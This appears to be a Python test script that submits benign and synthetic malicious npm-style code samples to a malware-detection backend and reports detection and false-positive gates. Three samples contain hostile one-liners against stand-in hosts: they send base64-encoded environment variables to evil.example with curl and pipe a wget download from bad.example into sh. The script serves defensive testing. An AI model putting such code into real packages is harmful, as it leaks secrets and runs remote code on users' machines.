#!/usr/bin/env python3
"""Run repeatable adversarial package analysis checks against a live OBELISK backend."""

from __future__ import annotations

import argparse
import json
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
import time
from typing import Any

import requests
from requests import RequestException


@dataclass(frozen=True)
class Sample:
    label: str
    category: str  # benign | malicious
    payload: dict[str, Any]


SAMPLES: list[Sample] = [
    Sample(
        label="benign_control",
        category="benign",
        payload={
            "name": "left-pad",
            "version": "1.3.0",
            "registry": "npm",
            "code": "function add(a,b){return a+b;} module.exports={add};",
        },
    ),
    Sample(
        label="synthetic_malicious_env_exfil",
        category="malicious",
        payload={
            "name": "reactt",
            "version": "1.0.0",
            "registry": "npm",
            "code": (
                "const cp=require('child_process');"
                "const d=Buffer.from(JSON.stringify(process.env)).toString('base64');"
                "cp.exec('curl -X POST https://evil.example/exfil -d '+d);"
                "eval('console.log(1)');"
            ),
        },
    ),
    Sample(
        label="synthetic_malicious_python_exec",
        category="malicious",
        payload={
            "name": "expresss",
            "version": "1.0.0",
            "registry": "npm",
            "code": (
                "import os,subprocess,base64\n"
                "subprocess.Popen(['sh','-c','wget http://bad.example/p.sh | sh'])\n"
                "print(base64.b64encode(str(dict(os.environ)).encode()).decode())"
            ),
        },
    ),
    Sample(
        label="synthetic_malicious_exec_obfuscation",
        category="malicious",
        payload={
            "name": "expresss",
            "version": "1.0.1",
            "registry": "npm",
            "code": (
                "const cp=require('child_process');"
                "const data=Buffer.from(JSON.stringify(process.env)).toString('base64');"
                "cp.exec('curl https://evil.example/'+data);"
                "eval('2+2');"
            ),
        },
    ),
]


def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Run adversarial package suite against /api/packages/analyze")
    parser.add_argument("--base-url", default="http://localhost:8000", help="Backend API base URL")
    parser.add_argument("--username", default="admin", help="Auth username")
    parser.add_argument("--password", default="REPLACE_WITH_STRONG_PASSWORD", help="Auth password")
    parser.add_argument(
        "--output",
        default="reports/adversarial/latest.json",
        help="Output report JSON path",
    )
    parser.add_argument(
        "--baseline",
        default="",
        help="Optional prior report path for before/after delta metrics",
    )
    parser.add_argument(
        "--require-docker-sandbox",
        action="store_true",
        help="Fail gates unless sandbox mode is docker for all samples",
    )
    parser.add_argument(
        "--benign-max-risk",
        type=float,
        default=20.0,
        help="Gate threshold for benign sample maximum risk score",
    )
    parser.add_argument("--timeout", type=float, default=120.0, help="HTTP timeout seconds")
    parser.add_argument(
        "--startup-wait-seconds",
        type=float,
        default=120.0,
        help="Maximum time to wait for backend health before running suite",
    )
    parser.add_argument(
        "--login-retries",
        type=int,
        default=8,
        help="Number of retries for login when backend is restarting",
    )
    parser.add_argument(
        "--disable-cache-bust",
        action="store_true",
        help="Use static sample versions (may hit analysis cache)",
    )
    parser.add_argument("--enforce", action="store_true", help="Return non-zero when gates fail")
    return parser.parse_args()


def _build_run_samples(disable_cache_bust: bool) -> list[Sample]:
    if disable_cache_bust:
        return SAMPLES

    nonce = int(time.time()) % 100000
    run_samples: list[Sample] = []
    for index, sample in enumerate(SAMPLES):
        payload = dict(sample.payload)
        payload["version"] = f"1.0.{nonce + index}"
        run_samples.append(
            Sample(
                label=sample.label,
                category=sample.category,
                payload=payload,
            )
        )

    return run_samples


def _wait_for_backend(base_url: str, timeout: float, startup_wait_seconds: float) -> None:
    deadline = time.time() + startup_wait_seconds
    while time.time() < deadline:
        try:
            resp = requests.get(f"{base_url}/health", timeout=min(timeout, 10.0))
            if resp.status_code == 200:
                return
        except RequestException:
            pass
        time.sleep(2)
    raise TimeoutError(f"Backend not healthy at {base_url}/health within {startup_wait_seconds} seconds")


def _login(base_url: str, username: str, password: str, timeout: float, retries: int) -> str:
    last_error: Exception | None = None
    for attempt in range(1, retries + 1):
        try:
            resp = requests.post(
                f"{base_url}/api/auth/login",
                json={"username": username, "password": password},
                timeout=timeout,
            )
            if resp.status_code in {502, 503, 504}:
                raise RuntimeError(f"Login unavailable (status={resp.status_code})")
            resp.raise_for_status()
            token = resp.json().get("access_token")
            if not token:
                raise RuntimeError("Login succeeded but no access_token returned")
            return token
        except Exception as exc:
            last_error = exc
            if attempt == retries:
                break
            time.sleep(min(2 * attempt, 8))

    raise RuntimeError(f"Login failed after {retries} attempts: {last_error}")


def _analyze_sample(base_url: str, token: str, sample: Sample, timeout: float) -> dict[str, Any]:
    headers = {"Authorization": f"Bearer {token}"}
    resp = requests.post(
        f"{base_url}/api/packages/analyze",
        json=sample.payload,
        headers=headers,
        timeout=timeout,
    )
    result: dict[str, Any] = {
        "label": sample.label,
        "category": sample.category,
        "status": resp.status_code,
        "ok": resp.status_code == 200,
    }
    if resp.status_code != 200:
        result["error"] = resp.text[:600]
        return result

    body = resp.json()
    detection = body.get("detection_details", {})
    behavior = detection.get("behavior", {})
    sandbox = behavior.get("evidence", {}).get("sandbox", {})

    result.update(
        {
            "risk_score": float(body.get("risk_score", 0.0) or 0.0),
            "threat_level": str(body.get("threat_level", "unknown")),
            "is_malicious": bool(body.get("is_malicious", False)),
            "confidence": float(body.get("confidence", 0.0) or 0.0),
            "detectors": {
                detector_name: {
                    "score": float(detector.get("score", 0.0) or 0.0),
                    "confidence": float(detector.get("confidence", 0.0) or 0.0),
                }
                for detector_name, detector in detection.items()
                if isinstance(detector, dict)
            },
            "sandbox": {
                "mode": sandbox.get("mode"),
                "enabled": sandbox.get("enabled"),
                "reason": sandbox.get("reason"),
                "network_attempts": sandbox.get("network_attempts"),
                "file_writes": sandbox.get("file_writes"),
                "process_spawns": sandbox.get("process_spawns"),
                "logs": sandbox.get("logs", []),
            },
            "risk_calibration": body.get("analysis", {}).get("calibration", {}),
        }
    )
    return result


def _compute_metrics(results: list[dict[str, Any]], benign_max_risk: float, require_docker_sandbox: bool) -> dict[str, Any]:
    all_200 = all(item.get("ok", False) for item in results)
    benign = [r for r in results if r.get("category") == "benign" and r.get("ok")]
    malicious = [r for r in results if r.get("category") == "malicious" and r.get("ok")]

    benign_max = max((float(r.get("risk_score", 0.0)) for r in benign), default=0.0)
    benign_fp = sum(1 for r in benign if float(r.get("risk_score", 0.0)) > benign_max_risk)
    malicious_detected = sum(1 for r in malicious if r.get("is_malicious") or r.get("threat_level") in {"high", "critical"})

    sandbox_modes = [str(r.get("sandbox", {}).get("mode", "")) for r in results if r.get("ok")]
    docker_mode_count = sum(1 for mode in sandbox_modes if mode == "docker")

    pre_scores = [
        float(r.get("risk_calibration", {}).get("pre_calibration_risk", r.get("risk_score", 0.0)) or 0.0)
        for r in results
        if r.get("ok")
    ]
    post_scores = [float(r.get("risk_score", 0.0) or 0.0) for r in results if r.get("ok")]

    calibration_changes = []
    for r in results:
        if not r.get("ok"):
            continue
        calibration = r.get("risk_calibration", {})
        before = float(calibration.get("pre_calibration_risk", r.get("risk_score", 0.0)) or 0.0)
        after = float(r.get("risk_score", 0.0) or 0.0)
        calibration_changes.append(
            {
                "label": r.get("label"),
                "policy": calibration.get("policy", "none"),
                "applied": bool(calibration.get("applied", False)),
                "before": round(before, 2),
                "after": round(after, 2),
                "delta": round(after - before, 2),
            }
        )

    gates = [
        {
            "name": "all_requests_successful",
            "pass": all_200,
            "detail": f"{sum(1 for r in results if r.get('ok'))}/{len(results)} responses returned HTTP 200",
        },
        {
            "name": "malicious_detection_gate",
            "pass": malicious_detected == len(malicious),
            "detail": f"detected={malicious_detected}/{len(malicious)} malicious samples",
        },
        {
            "name": "benign_false_positive_gate",
            "pass": benign_fp == 0,
            "detail": f"benign_max_risk={benign_max:.2f}, threshold={benign_max_risk:.2f}",
        },
    ]

    if require_docker_sandbox:
        gates.append(
            {
                "name": "docker_sandbox_mode_gate",
                "pass": docker_mode_count == len(sandbox_modes) and len(sandbox_modes) > 0,
                "detail": f"docker_mode_samples={docker_mode_count}/{len(sandbox_modes)}",
            }
        )

    return {
        "all_requests_200": all_200,
        "benign_max_risk": round(benign_max, 2),
        "benign_false_positive_count": benign_fp,
        "malicious_detected_count": malicious_detected,
        "malicious_sample_count": len(malicious),
        "docker_mode_count": docker_mode_count,
        "sample_count": len(results),
        "avg_risk_before_calibration": round(sum(pre_scores) / len(pre_scores), 2) if pre_scores else 0.0,
        "avg_risk_after_calibration": round(sum(post_scores) / len(post_scores), 2) if post_scores else 0.0,
        "calibration_changes": calibration_changes,
        "gates": gates,
        "overall_pass": all(gate["pass"] for gate in gates),
    }


def _load_baseline(path: str) -> dict[str, Any] | None:
    if not path:
        return None
    baseline_path = Path(path)
    if not baseline_path.exists():
        raise FileNotFoundError(f"Baseline report not found: {baseline_path}")
    return json.loads(baseline_path.read_text())


def _compute_delta(current_results: list[dict[str, Any]], baseline_report: dict[str, Any]) -> dict[str, Any]:
    baseline_results = {
        item.get("label"): item
        for item in baseline_report.get("results", [])
        if isinstance(item, dict)
    }

    per_sample: list[dict[str, Any]] = []
    for item in current_results:
        label = item.get("label")
        previous = baseline_results.get(label)
        if not previous:
            continue
        current_risk = float(item.get("risk_score", 0.0) or 0.0)
        previous_risk = float(previous.get("risk_score", 0.0) or 0.0)
        per_sample.append(
            {
                "label": label,
                "risk_delta": round(current_risk - previous_risk, 2),
                "before_risk": round(previous_risk, 2),
                "after_risk": round(current_risk, 2),
                "before_threat": previous.get("threat_level"),
                "after_threat": item.get("threat_level"),
            }
        )

    benign = [s for s in per_sample if next((r for r in current_results if r.get("label") == s["label"]), {}).get("category") == "benign"]
    malicious = [s for s in per_sample if next((r for r in current_results if r.get("label") == s["label"]), {}).get("category") == "malicious"]

    def _avg(rows: list[dict[str, Any]], key: str) -> float:
        if not rows:
            return 0.0
        return round(sum(float(r.get(key, 0.0) or 0.0) for r in rows) / len(rows), 2)

    return {
        "per_sample": per_sample,
        "avg_benign_risk_before": _avg(benign, "before_risk"),
        "avg_benign_risk_after": _avg(benign, "after_risk"),
        "avg_malicious_risk_before": _avg(malicious, "before_risk"),
        "avg_malicious_risk_after": _avg(malicious, "after_risk"),
    }


def main() -> int:
    args = _parse_args()
    run_samples = _build_run_samples(args.disable_cache_bust)

    normalized_base_url = args.base_url.rstrip("/")
    _wait_for_backend(normalized_base_url, args.timeout, args.startup_wait_seconds)
    token = _login(normalized_base_url, args.username, args.password, args.timeout, args.login_retries)
    results = [_analyze_sample(normalized_base_url, token, sample, args.timeout) for sample in run_samples]

    metrics = _compute_metrics(
        results,
        benign_max_risk=args.benign_max_risk,
        require_docker_sandbox=args.require_docker_sandbox,
    )

    report: dict[str, Any] = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "base_url": args.base_url,
        "config": {
            "require_docker_sandbox": args.require_docker_sandbox,
            "benign_max_risk": args.benign_max_risk,
            "sample_count": len(run_samples),
            "cache_bust_enabled": not args.disable_cache_bust,
        },
        "results": results,
        "metrics": metrics,
    }

    baseline_report = _load_baseline(args.baseline)
    if baseline_report is not None:
        report["before_after_delta"] = _compute_delta(results, baseline_report)

    output_path = Path(args.output)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(json.dumps(report, indent=2))

    print(json.dumps(report, indent=2))

    if args.enforce and not metrics.get("overall_pass", False):
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
